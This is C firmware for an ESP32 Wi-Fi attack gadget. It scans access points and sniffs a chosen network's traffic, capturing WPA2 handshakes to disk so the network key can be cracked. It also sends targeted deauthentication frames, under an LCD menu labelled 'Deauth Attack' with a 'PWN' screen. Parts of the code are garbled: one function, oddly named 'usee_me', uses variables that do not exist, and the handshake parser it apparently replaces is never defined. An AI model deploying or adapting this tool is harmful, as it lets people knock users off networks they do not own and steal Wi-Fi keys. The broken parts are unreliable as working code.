#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <dirent.h>

#include "esp_system.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_timer.h"
#include "esp_mac.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "wifi.h"
#include "user_interface.h"
#include "wsl_bypasser.h"
#include "tcp_file_server.h"
#include "pkt_sniffer.h"

#define TIMER_DELAY_MS 1000
#define DEFAULT_SCAN_LIST_SIZE 16
#define EXAMPLE_ESP_WIFI_SSID "Linksys-76fc"
#define EXAMPLE_ESP_WIFI_CHANNEL 1
#define EXAMPLE_ESP_WIFI_PASS "abcd1234"
#define EXAMPLE_MAX_STA_CONN 1

#define MAC_LEN 6
#define MAX_SSID_LEN 32
#define MOUNT_PATH "/spiffs"

static const char* TAG = "WIFI";

// Maintain a list of APs in order of RSSI
static wifi_ap_record_t ap_info[sizeof(wifi_ap_record_t) * DEFAULT_SCAN_LIST_SIZE];
static uint16_t ap_count = 0;

// Maintain an "active" mac list. That is we choose an AP to target and we
// log every STA MAC that is associated with that AP. The active mac list gets
// updated by the packet sniffer, scanning packets for STAs on an ap, WPA2
// handshakes and strength of STAs
static uint8_t pkt_sniffer_running = 0;

struct sta
{
    uint8_t mac[MAC_LEN];
    int8_t rssi;
} typedef active_mac_t;

static active_mac_t active_mac_list[sizeof(active_mac_t) * DEFAULT_SCAN_LIST_SIZE];
static uint8_t active_mac_list_len = 0;
static int8_t active_mac_target_ap = -1;
static SemaphoreHandle_t active_mac_list_lock;

// We allocate a single buffer to store a single WPA2 handshake. When scanning
// for handshakes, we have a target AP which means we only need one handshake
// to crack that AP. When all packets have been found we flush them to disk.
// We also double check that if we have a good handshake that we do not clear
// the in mem buffer unless its been flushed to disk. The in ram buffer is as
// follows:
//
// |-----------|-----------|---------|---------|---------|---------|
// | Assoc Req | Assoc Res | EAPOL 1 | EAPOL 2 | EAPOL 3 | EAPOL 4 |
// |-----------|-----------|---------|---------|---------|---------|
// 
// Each of the 6 packet slots gets a 256 buffer. If the packet is smaller we
// just pad the rest as we maintain the lengths of each packet. When dumping to
// disk and sending over network the lengths are written first, fitting in a 
// 2 byte integer, followed by the packet data with no padding.
#define EAPOL_MAX_PKT_LEN 256
#define EAPOL_NUM_PKTS    6
#define EAPOl_SEMA_TIMEOUT_MS 10
static uint8_t eapol_buffer[EAPOL_MAX_PKT_LEN * EAPOL_NUM_PKTS];
static uint16_t eapol_pkt_lens[EAPOL_NUM_PKTS];
static uint8_t eapol_pkts_captured = 0;
static uint8_t eapol_pkts_written_out = 0;
static SemaphoreHandle_t eapol_lock;

// We maintain a single timer to be used as a "poll n dump" function ie every
// TIMER_DELAY_MS milliseconds execute a function that usually polls and sends
// data to the serial console or the lcd
static esp_timer_handle_t gp_timer;
static esp_timer_create_args_t gp_timer_args = 
{
    .callback = NULL,
    .name = "Wifi GP Timer"
};
static uint8_t gp_timer_running = 0;

int8_t client_id = -1;
uint8_t client_mac[MAC_LEN];

//*****************************************************************************
// Wifi Event Loop Handler -> Handles action at the AP/STA level with regards
// to the client. We also have the functions for starting and stopping the 
// SoC AP
//*****************************************************************************

static void wifi_event_handler(void* arg, esp_event_base_t event_base,
                                    int32_t event_id, void* event_data)
{
    if (event_id == WIFI_EVENT_AP_STACONNECTED) 
    {
        wifi_event_ap_staconnected_t* event = (wifi_event_ap_staconnected_t*) event_data;
        

        client_id = event->aid;
        memcpy(client_mac, event->mac, MAC_LEN);
        ESP_LOGI(TAG, "In wifi event handler - station "MACSTR" with id=%d connected to SoC AP", MAC2STR(client_mac), client_id);

        launch_tcp_file_server(MOUNT_PATH);
        
    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) 
    {
        wifi_event_ap_stadisconnected_t* event = (wifi_event_ap_stadisconnected_t*) event_data;
        ESP_LOGI(TAG, "In wifi event handler - station "MACSTR" Diconnect Event, AID=%d", MAC2STR(event->mac), event->aid);

        // Just need to trigger the client handler task to clean up its shit
        kill_tcp_file_server();
        client_id = -1;
        memset(client_mac, 0, MAC_LEN);
    }
    else
    {
        ESP_LOGI(TAG, "Unhandled WIFI event");
    }
}

//*****************************************************************************
// Client STA handler code
//*****************************************************************************

static void deauth_client(void)
{
    ESP_ERROR_CHECK(esp_wifi_deauth_sta(client_id));
        ESP_LOGI(TAG, "station "MACSTR" kicked, AID = %d", MAC2STR(client_mac), client_id);  
}

//*****************************************************************************
// General Purpose Timer - We provide this as a quick way for UI and REPL cmds
// to register polling output to their respective medium.
//*****************************************************************************

static void gp_timer_create_n_start(void* fp)
{
    if(gp_timer_running)
    {
        ESP_LOGE(TAG, "GP Timer started when already running");
        return;
    }

    gp_timer_args.callback = fp;
    ESP_ERROR_CHECK(esp_timer_create(&gp_timer_args, &gp_timer));
    ESP_ERROR_CHECK(esp_timer_start_periodic(gp_timer, TIMER_DELAY_MS*1000));
    gp_timer_running = 1;

    ESP_LOGI(TAG, "GP Timer started");
}

static void gp_timer_stop_n_destroy(void)
{
    if(!gp_timer_running)
    {
        ESP_LOGE(TAG, "GP Timer stoped when not running");
        return;
    }

    ESP_ERROR_CHECK(esp_timer_stop(gp_timer));
    ESP_ERROR_CHECK(esp_timer_delete(gp_timer));
    gp_timer_running = 0;

    ESP_LOGI(TAG, "GP Timer Stopped");
}

//*****************************************************************************
// AP List Accessor Funcs
//*****************************************************************************

static void update_ap_info()
{
    ESP_LOGI(TAG, "Scanning and Updating AP List");
    uint16_t max_ap_count = DEFAULT_SCAN_LIST_SIZE;
    esp_wifi_scan_start(NULL, true);
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&max_ap_count, ap_info));
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
    
    if(ap_count >= DEFAULT_SCAN_LIST_SIZE)
    {
        ap_count = DEFAULT_SCAN_LIST_SIZE;
    }

    ESP_ERROR_CHECK(esp_wifi_clear_ap_list());

    ESP_ERROR_CHECK(esp_wifi_scan_stop());
}

//*****************************************************************************
// Active MAC List Accessor Functions
//*****************************************************************************

static inline uint8_t mac_is_eq(uint8_t* m1, uint8_t* m2)
{
    uint8_t i = 0;
    for(; i < MAC_LEN; ++i)
    {
        if(m1[i]!=m2[i])
        {
            return 0;
        }
    }

    return 1;
}

static inline uint8_t* get_nth_mac(uint8_t n)
{
    if(n >= active_mac_list_len)
    {
        ESP_LOGE(TAG, "In get nth mac, out of bounds");
        return NULL;
    }

    return (uint8_t*) &(active_mac_list[n]);
}

static inline int8_t get_nth_rssi(uint8_t n)
{
    if(n >= active_mac_list_len)
    {
        ESP_LOGE(TAG, "In get nth rssi, out of bounds");
        return -1;
    }

    return active_mac_list[n].rssi;
}

static inline void set_nth_mac(uint8_t n, uint8_t* m1)
{
    if(n >= active_mac_list_len)
    {
        ESP_LOGE(TAG, "In set nth mac, out of bounds");
        return;
    }

    uint8_t i;
    for(i = 0; i < MAC_LEN; ++i)
    {  
        get_nth_mac(n)[i] = m1[i];
    }

}

static inline void set_nth_rssi(uint8_t n, int8_t rssi)
{
     if(n >= active_mac_list_len)
    {
        ESP_LOGE(TAG, "In set nth rssi, out of bounds");
        return;
    }

    active_mac_list[n].rssi = rssi;
}

static inline void insert_mac(uint8_t* m1, int8_t rssi)
{
    if(active_mac_list_len == DEFAULT_SCAN_LIST_SIZE)
    {
        ESP_LOGE(TAG, "ACTIVE MAC LIST FULL");
        return;
    }

    if(!xSemaphoreTake(active_mac_list_lock, 0))
    {
        // ESP_LOGI(TAG, "insert mac failed ..  busy");
        return;
    }

    uint8_t i = 0;
    for(; i < active_mac_list_len; ++i)
    {
        if(mac_is_eq(m1, get_nth_mac(i)))
        {
            set_nth_rssi(i, rssi);
            assert(xSemaphoreGive(active_mac_list_lock) == pdTRUE);
            return;
        }
    }

    ++active_mac_list_len;
    set_nth_mac(active_mac_list_len-1, m1);    
    set_nth_rssi(active_mac_list_len-1, rssi);
    assert(xSemaphoreGive(active_mac_list_lock) == pdTRUE);

}

static void eapol_dump_to_disk(void)
{
    char path[MAX_SSID_LEN+1];

    snprintf(path, MAX_SSID_LEN+1, "%s/%.15s.pkt", MOUNT_PATH, ap_info[active_mac_target_ap].ssid);
    
    ESP_LOGI(TAG, "Opening %s to writeout eapol pkts", path);
    FILE* f = fopen(path, "w");
    if(!f)
    {
        ESP_LOGE(TAG, "Failed to open %s - %s", path, strerror(errno));
        fclose(f);
        return;
    }

    size_t num_written = fwrite(eapol_pkt_lens, 1, 2*EAPOL_NUM_PKTS, f);
    if(num_written != 2 * EAPOL_NUM_PKTS)
    {
        ESP_LOGE(TAG, "Failed to write EAPOL Header (%d / %d)", num_written, 2*EAPOL_NUM_PKTS);
        fclose(f);
        return;
    }

    uint8_t i;
    for(i = 0; i < EAPOL_NUM_PKTS; ++i)
    {
        num_written = fwrite(eapol_buffer + i*EAPOL_MAX_PKT_LEN, 1, eapol_pkt_lens[i], f);
        if(num_written != eapol_pkt_lens[i])
        {
            ESP_LOGE(TAG, "Failed to write EAPOL %d Pkt (%d / %d)", i, num_written, eapol_pkt_lens[i]);
            fclose(f);
            return;
        }
    }
    
    fclose(f);
    ESP_LOGI(TAG, "Write out of EAPOL pkts successful!");
    eapol_pkts_written_out = 1;

}

static void clear_active_mac_list(void)
{
    if(!xSemaphoreTake(active_mac_list_lock, 0))
    {
        ESP_LOGI(TAG, "clear mac list failed ..  busy");
        return;
    }

    if(eapol_pkts_captured == EAPOL_NUM_PKTS && eapol_pkts_written_out == 0)
    {
        eapol_dump_to_disk();
    }

    active_mac_list_len = 0;
    active_mac_target_ap = -1;
    eapol_pkts_captured = 0;
    eapol_pkts_written_out = 0;
    eapol_pkt_lens[0] = 0;
    eapol_pkt_lens[1] = 0;
    eapol_pkt_lens[2] = 0;
    eapol_pkt_lens[3] = 0;
    eapol_pkt_lens[4] = 0;
    eapol_pkt_lens[5] = 0;
    assert(xSemaphoreGive(active_mac_list_lock) == pdTRUE);
    ESP_LOGI(TAG, "Active MAC List Cleared");
}

//*****************************************************************************
// PKT Sniffer Code
//*****************************************************************************

static void set_active_mac_ap_target(uint8_t ap_index)
{
    if(ap_index >= ap_count )
    {
        ESP_LOGE(TAG, "TRIED to set STA scan target to AP outside of range");
        return;
    }

    ESP_LOGI(TAG, "Active Mac Scan AP target set to %s", ap_info[ap_index].ssid);
    active_mac_target_ap = ap_index;

}



static void usee_me(void)
{

    if(num > 5)
    {
        return;
    }

    ESP_LOGI(TAG, "%s -- Recovered WPA2 (%d)", ap_info[active_mac_target_ap].ssid, num);

    if(!xSemaphoreTake(eapol_lock, EAPOl_SEMA_TIMEOUT_MS / portTICK_PERIOD_MS))
    {
        ESP_LOGE(TAG, "BAD VERY BAD .. EAPOL lock time out on handshake pkt %d ... dropping pkt", num);
        return;
    }

    if(len >= EAPOL_MAX_PKT_LEN)
    {
        ESP_LOGE(TAG, "ERROR EAPOL packet too long");
        assert(xSemaphoreGive(eapol_lock));
    }

    if(eapol_pkt_lens[num] == 0)
    {
        eapol_pkt_lens[num] = len;
        memcpy(eapol_buffer + EAPOL_MAX_PKT_LEN*num, p, len);
        ++eapol_pkts_captured;
    }
    else
    {
        ESP_LOGI(TAG, "Recieved a duplicate eapol pkt %d - possibly observed partial handshake", num);
    }

    if(eapol_pkts_captured == EAPOL_NUM_PKTS && eapol_pkts_written_out == 0)
    {
        eapol_dump_to_disk();
    }

    assert(xSemaphoreGive(eapol_lock));
    
}

static void pkt_sniffer_cb(void* buff, wifi_promiscuous_pkt_type_t type)
{
   
    wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*) buff;

    // uint8_t* m1 = p->payload + 4;
    uint8_t* m2 = p->payload + 10;
    uint8_t* m3 = p->payload + 16;

    if(mac_is_eq(m3, ap_info[active_mac_target_ap].bssid))
    {
        insert_mac(m2, p->rx_ctrl.rssi);
        eapol_pkt_parse(p->payload, p->rx_ctrl.sig_len);
    }

}

static void launch_pkt_sniffer()
{
    if(pkt_sniffer_running)
    {
        ESP_LOGE(TAG, "Called launch_pkt_sniffer when already running");
        return;
    }

    if(active_mac_target_ap == -1)
    {
        ESP_LOGE(TAG, "Called launch_pkt_sniffer without setting an active MAC AP target");
        return;
    }

    if(client_id !=-1)
    {
        ESP_LOGI(TAG, "In launch_pkt_sniffer - deauthing client");
        deauth_client();
    }

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(1));

    wifi_promiscuous_filter_t filt = 
    {
        .filter_mask=WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT
    };

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filt));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(&pkt_sniffer_cb));
    ESP_ERROR_CHECK(esp_wifi_set_channel(ap_info[active_mac_target_ap].primary, WIFI_SECOND_CHAN_NONE));
    pkt_sniffer_running = 1;

    ESP_LOGI(TAG, "Pkt Sniffer Running w/ target AP ssid = %s", ap_info[active_mac_target_ap].ssid);

}

static void kill_pkt_sniffer(void)
{
    if(!pkt_sniffer_running)
    {
        ESP_LOGE(TAG, "Called kill_pkt_sniffer when not running");
        return;
    }

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(0));
    pkt_sniffer_running = 0;

    ESP_LOGI(TAG, "Pkt Sniffer Killed");
}

//*****************************************************************************
// REPL SCAN AP CMD
//*****************************************************************************

int do_repl_scan_ap(int argc, char** argv)
{
    update_ap_info();

    int i;
    for(i = 0; i < ap_count; ++i)
    {
        printf("%d - SSID=%-19s   BSSID=%02x:%02x:%02x:%02x:%02x:%02x   Channel=%02d   RSSI=%03d\n", i, ap_info[i].ssid, ap_info[i].bssid[0],ap_info[i].bssid[1],ap_info[i].bssid[2],ap_info[i].bssid[3],ap_info[i].bssid[4],ap_info[i].bssid[5], ap_info[i].primary, ap_info[i].rssi);
    }

    return 0;
}

//*****************************************************************************
// REPL SCAN MAC CMD
//*****************************************************************************

static void repl_scan_mac_time_cb(void* arg)
{
    uint8_t i;
    for(i = 0; i < active_mac_list_len; ++i)
    {
        uint8_t* m1 = get_nth_mac(i);
        printf("MAC %d = %02x:%02x:%02x:%02x:%02x:%02x   RSSI=%03d\n", i, m1[0], m1[1], m1[2], m1[3], m1[4], m1[5], get_nth_rssi(i));
    }
    printf("\n");

} 

int do_repl_scan_mac_start(int argc, char** argv)
{
    if(argc != 2)
    {
        ESP_LOGE(TAG, "Usage: scan_mac_start <ssid index>");
        return 1;
    }

    if(ap_count == 0)
    {
        ESP_LOGE(TAG, "Please run an AP scan or get to area with APs");
        return 1;
    }

    set_active_mac_ap_target( (uint8_t) strtol(argv[1], NULL,10) );

    if(pkt_sniffer_running)
    {
        ESP_LOGE(TAG, "In do_repl_scan_mac_start - PKT Sniffer Already Running");
    }
    else
    {
        launch_pkt_sniffer();
    }

    if(gp_timer_running)
    {
        ESP_LOGE(TAG, "In do_repl_scan_mac_start - GP Timer in use");
    }
    else
    {
        gp_timer_create_n_start(&repl_scan_mac_time_cb);
    }

    return 0;
}

int do_repl_scan_mac_stop(int argc, char** argv)
{
    if(!gp_timer_running)
    {
        ESP_LOGE(TAG, "In do_repl_scan_mac_stop- GP timer already killed");
    }
    else
    {
        gp_timer_stop_n_destroy();
    }

    if(!pkt_sniffer_running)
    {
        ESP_LOGE(TAG, "In do_repl_scan_mac_stop - PKT Sniffer already killed");
    }
    else
    {
        kill_pkt_sniffer();
        clear_active_mac_list();
    }

    return 0;
}

//*****************************************************************************
// REPL Deauth STA CMD
//*****************************************************************************

int do_deauth(int argc, char** argv)
{  
    if(argc != 2)
    {
        ESP_LOGE(TAG, "Usage: deauth <mac index>");
        return 1;
    }

    if(!pkt_sniffer_running)
    {
        ESP_LOGE(TAG, "Please run the pkt sniffer first");
        return 1;
    }

    uint8_t i = (uint8_t) strtol(argv[1], NULL,10);
    wsl_bypasser_send_deauth_frame_targted(ap_info[active_mac_target_ap].bssid, (uint8_t*) &active_mac_list[i]);
    ESP_LOGI(TAG, "DEAUTH SENT AP=%s STA="MACSTR, ap_info[active_mac_target_ap].bssid, MAC2STR((uint8_t*) &active_mac_list[i]));

    return 0;
}

//*****************************************************************************
// UI SCAN AP. Pretty straightforward lcd UI command. On init of this cmd we
// home the screen, clear it and put an indicator that we are scanning. And 
// lock the cursor cause we dont want anyone messing around. We then push the
// AP info to the buff, unlock cursor and return. Nothing to do for button cb
// or fini.
//*****************************************************************************

void lcd_dump_ap(uint8_t i, uint8_t* line_counter)
{
    char line_buff[20] = {0};

    strncpy(line_buff, (char*) ap_info[i].ssid, 19);
    push_to_line_buffer(*line_counter, line_buff);
    (*line_counter)++;

    snprintf(line_buff,19, "%02x:%02x:%02x:%02x:%02x:%02x", ap_info[i].bssid[0],ap_info[i].bssid[1],ap_info[i].bssid[2],ap_info[i].bssid[3],ap_info[i].bssid[4],ap_info[i].bssid[5]);
    push_to_line_buffer(*line_counter, line_buff);
    (*line_counter)++;

    snprintf(line_buff,19, "Channel=%02d", ap_info[i].primary);
    push_to_line_buffer(*line_counter, line_buff);
    (*line_counter)++;

    snprintf(line_buff,19, "RSSI=%03d", ap_info[i].rssi);
    push_to_line_buffer(*line_counter, line_buff);
    (*line_counter)++;

    line_buff[0] = ' ';
    line_buff[1] = (char) 0;
    push_to_line_buffer(*line_counter, line_buff);
    (*line_counter)++;
}

void ui_scan_ap_cb(uint8_t i)
{
    ESP_LOGI(TAG, "UI SCAN AP CMD CB");
}

void ui_scan_ap_fini(void)
{
    ESP_LOGI(TAG, "UI SCAN AP CMD FINI");
}

void ui_scan_ap_ini(void)
{
    ESP_LOGI(TAG, "UI SCAN AP CMD INI");

    lock_cursor();
    home_screen_pos();
    push_to_line_buffer(0, "Scanning...");
    push_to_line_buffer(1, "");
    push_to_line_buffer(2, "");
    push_to_line_buffer(3, "");
    update_display();
    update_ap_info();

    uint8_t i;
    uint8_t line_counter = 0;
    for(i = 0; i < ap_count; ++i)
    {
        lcd_dump_ap(i, &line_counter);   // puts in line buffer
    }

    unlock_cursor();
    
    return;   // updates display upon return
}

//*****************************************************************************
// STA Scanner LCD UI APP - On init it starts scanning for MACs, periodically
// updating the screen with number of MACS found. Pressing the button stops the
// scanning and presents the list of MACS and an option to go back to scanning.
// If the index is a MAC, then we start scanning only that STA, reporting the
// rssi. A single press on this screen brings you back to num macs scanning and
// does not clear the set of MACs found.
//*****************************************************************************

static uint8_t report_num_macs_timer_running = 0;
static uint8_t selecting_target_mac = 0;
static uint8_t report_rssi_timer_running = 0;
static uint8_t target_mac = 0;

static void report_num_macs_cb(void* args)
{   
    char line[20];
    snprintf(line, 19, "MACS Found = %03d", active_mac_list_len);
    push_to_line_buffer(1, line);
    snprintf(line, 19, "EAPOL PKTS = %01d", eapol_pkts_captured);
    push_to_line_buffer(2, line);
    if(eapol_pkts_written_out)
    {
        push_to_line_buffer(3, "Handshake Captured");
    }
    else
    {
        push_to_line_buffer(3, "");
    }

    update_display();
}

static void start_report_num_macs_timer(void)
{
    if(gp_timer_running)
    {
        ESP_LOGE(TAG, "In start_report_num_macs_timer - GP timer in use");
    }
    gp_timer_create_n_start(&report_num_macs_cb);
    report_num_macs_timer_running = 1;
}

static void stop_report_num_macs_timer(void)
{
    if(!gp_timer_running)
    {
        ESP_LOGE(TAG, "In stop_report_num_macs_timer - GP timer already killed");
    }

    gp_timer_stop_n_destroy();
    report_num_macs_timer_running = 0;
}

static void report_rssi_cb(void* args)
{   
    char line[20];
    snprintf(line, 19, "RSSI = %03d   ", get_nth_rssi(target_mac));
    push_to_line_buffer(2, line);
    update_line(2);
}

static void start_report_rssi_timer(void)
{
    if(gp_timer_running)
    {
        ESP_LOGE(TAG, "In start_report_rssi_timer - GP timer in use");
    }

    gp_timer_create_n_start(&report_rssi_cb);
    report_rssi_timer_running = 1;
}

static void stop_report_rssi_timer(void)
{
    if(!gp_timer_running)
    {
        ESP_LOGE(TAG, "In start_report_rssi_timer - GP timer already killed");
    }

    gp_timer_stop_n_destroy();
    report_rssi_timer_running = 0;
}

static void list_ssids_lcd(void)
{
    uint8_t i;
    char line_buff[20] = {0};
    for(i = 0; i < ap_count; ++i)
    {
        strncpy(line_buff, (char*) ap_info[i].ssid, 19);
        push_to_line_buffer(i, line_buff);
    }
}

static void ui_scan_mac_fini(void) 
{
    ESP_LOGI(TAG, "UI SCAN MAC CMD FINI");

    if(report_num_macs_timer_running)
    {
        stop_report_num_macs_timer();
    }

    if(report_rssi_timer_running)
    {
        stop_report_rssi_timer();
    }

    selecting_target_mac = 0;

    if(!pkt_sniffer_running)
    {   
        ESP_LOGE(TAG, "In ui_scan_mac_fini - Pkt Sniffer Already Killed");
    }
    else
    {
        kill_pkt_sniffer();    
    }

    clear_active_mac_list();
}

static void ui_scan_mac_cb(uint8_t index)
{
    ESP_LOGI(TAG, "UI SCAN AP CMD CB");

    char line[20];

    if(!report_num_macs_timer_running && !selecting_target_mac && !report_rssi_timer_running)
    {
        if(index >= ap_count)
        {
            ESP_LOGE(TAG, "In Scan STA UI app, tried to set AP index out of range");
            home_screen_pos();
            return;
        }

        set_active_mac_ap_target(index);

        if(pkt_sniffer_running)
        {
            ESP_LOGE(TAG, "In ui_scan_mac_cb - Pkt Sniffer already running");
        }
        else
        {
            launch_pkt_sniffer();
        }
        
        lock_cursor();
        home_screen_pos();
        strncpy(line, (char*) ap_info[active_mac_target_ap].ssid, 19);
        push_to_line_buffer(0, line);
        snprintf(line, 19, "MACS Found = %03d", active_mac_list_len);
        push_to_line_buffer(1, line);
        snprintf(line, 19, "EAPOL PKTS = %01d", eapol_pkts_captured);
        push_to_line_buffer(2, line);
        push_to_line_buffer(3, "");
        
        
        update_display();

        start_report_num_macs_timer();
        
        return;
    }

    if(report_num_macs_timer_running && !selecting_target_mac && !report_rssi_timer_running)
    {
        // The timer was running collecting MACS and reporting the number. On
        // button press we now show the MACS collected and wait for another
        // button click, selecting the MAC.

        // Try to grab the mac list lock cuz we dont want anyone messing with
        // it while we select an active mac. Will release it once we select a 
        // MAC

        if(!xSemaphoreTake(active_mac_list_lock, 10 / portTICK_PERIOD_MS))
        {
            ESP_LOGE(TAG, "In scan_sta_ui_cb, failed to grab lock ... busy");
            return;
        }

        if(active_mac_list_len == 0)
        {
            ESP_LOGI(TAG, "In scan sta ui cb, no moving to select mac state as non are avaible");
            assert(xSemaphoreGive(active_mac_list_lock));
            return;
        }


        stop_report_num_macs_timer();

        home_screen_pos();

        uint8_t i;
        for(i = 0; i < active_mac_list_len; ++i)
        {
            snprintf(line, 19, "%02x:%02x:%02x:%02x:%02x:%02x", get_nth_mac(i)[0], get_nth_mac(i)[1], get_nth_mac(i)[2],get_nth_mac(i)[3],get_nth_mac(i)[4],get_nth_mac(i)[5]);
            push_to_line_buffer(i, line);
        }

        // If less then 4 macs, clear the rest of the screen
        for(;i<4;++i)
        {
            push_to_line_buffer(i, "");
        }

        update_display();
        unlock_cursor();
        selecting_target_mac = 1;

        return;
    }
    
    if(!report_num_macs_timer_running && selecting_target_mac && !report_rssi_timer_running)
    {
        // Now index carries the MAC we which to do an RSSI scan on, check to
        // see if its in bounds, set up screen and timer and launch timer. Also
        // be sure to give the lock up

        if(index >= active_mac_list_len)
        {
            ESP_LOGE(TAG, "In scan sta ui cb selecting MAC out of range");
            return;
        }

        target_mac = index;
        selecting_target_mac = 0;
        assert(xSemaphoreGive(active_mac_list_lock) == pdTRUE);

        
        lock_cursor();
        home_screen_pos();
        set_cursor(3);
        strncpy(line, (char*) ap_info[active_mac_target_ap].ssid, 19);
        push_to_line_buffer(0, line);
        snprintf(line, 19, MACSTR, MAC2STR(get_nth_mac(target_mac)));
        push_to_line_buffer(1, line);
        snprintf(line, 19, "RSSI = %03d   ", get_nth_rssi(target_mac));
        push_to_line_buffer(2, line);
        push_to_line_buffer(3, "-----> PWN <------");
        update_display();

        start_report_rssi_timer();

        return;
    }

    if(!report_num_macs_timer_running && !selecting_target_mac && report_rssi_timer_running)
    {
        // This cancels our rssi timer and should bring us back to report num
        // mac state. Kill the report rssi timer, reset screen and launch the
        // num macs timers

        // Also here is where we send the deauth pkt

        stop_report_rssi_timer();

        wsl_bypasser_send_deauth_frame_targted(ap_info[active_mac_target_ap].bssid, (uint8_t*) &active_mac_list[target_mac]);
        ESP_LOGI(TAG, "DEAUTH SENT AP=%s STA="MACSTR, ap_info[active_mac_target_ap].bssid, MAC2STR((uint8_t*) &active_mac_list[target_mac]));

        lock_cursor();
        home_screen_pos();
        strncpy(line, (char*) ap_info[active_mac_target_ap].ssid, 19);
        push_to_line_buffer(0, line);
        snprintf(line, 19, "MACS Found = %03d", active_mac_list_len);
        push_to_line_buffer(1, line);
        snprintf(line, 19, "EAPOL PKTS = %01d", eapol_pkts_captured);
        push_to_line_buffer(2, line);
        push_to_line_buffer(3, "");
        update_display();

        start_report_num_macs_timer();
        
        return;
    }
}

static void ui_scan_mac_ini(void)
{
    ESP_LOGI(TAG, "UI SCAN AP CMD INI");

    lock_cursor();
    home_screen_pos();
    push_to_line_buffer(0, "Scanning APs...");
    push_to_line_buffer(1, "");
    push_to_line_buffer(2, "");
    push_to_line_buffer(3, "");
    update_display();
    update_ap_info();
    list_ssids_lcd();
    unlock_cursor();
}

//*****************************************************************************
// PUBLIC
//*****************************************************************************

void init_wifi(void)
{
        // ESP NET IF init
    esp_netif_t *sta_netif = NULL;
    esp_netif_t *ap_netif = NULL;
    ESP_ERROR_CHECK(esp_netif_init());
    sta_netif = esp_netif_create_default_wifi_sta();
    ap_netif = esp_netif_create_default_wifi_ap();
    assert(ap_netif);
    assert(sta_netif);
    
    // Wifi early init config (RX/TX buffers etc)
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    // Handle dem wifi events on the default event loop
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        NULL));

    wifi_config_t wifi_config = {
        .ap = {
            .ssid = EXAMPLE_ESP_WIFI_SSID,
            .ssid_len = strlen(EXAMPLE_ESP_WIFI_SSID),
            .channel = EXAMPLE_ESP_WIFI_CHANNEL,
            .password = EXAMPLE_ESP_WIFI_PASS,
            .max_connection = EXAMPLE_MAX_STA_CONN,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .pmf_cfg = {
                    .required = false,
            },
        },
    };

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    uint8_t mac[6];
    ESP_ERROR_CHECK(esp_netif_get_mac(sta_netif, mac));
    ESP_LOGI(TAG, "STA if created -> %02x:%02x:%02x:%02x:%02x:%02x", 
                mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);

    ESP_ERROR_CHECK(esp_netif_get_mac(ap_netif, mac));
    ESP_LOGI(TAG, "AP if created -> %02x:%02x:%02x:%02x:%02x:%02x", 
                mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    active_mac_list_lock = xSemaphoreCreateBinary();
    eapol_lock = xSemaphoreCreateBinary();

    assert(xSemaphoreGive(active_mac_list_lock) == pdTRUE);
    assert(xSemaphoreGive(eapol_lock) == pdTRUE);

    add_ui_cmd("Scan AP", ui_scan_ap_ini, ui_scan_ap_cb, ui_scan_ap_fini);
    add_ui_cmd("Deauth Attack", ui_scan_mac_ini, ui_scan_mac_cb, ui_scan_mac_fini);
}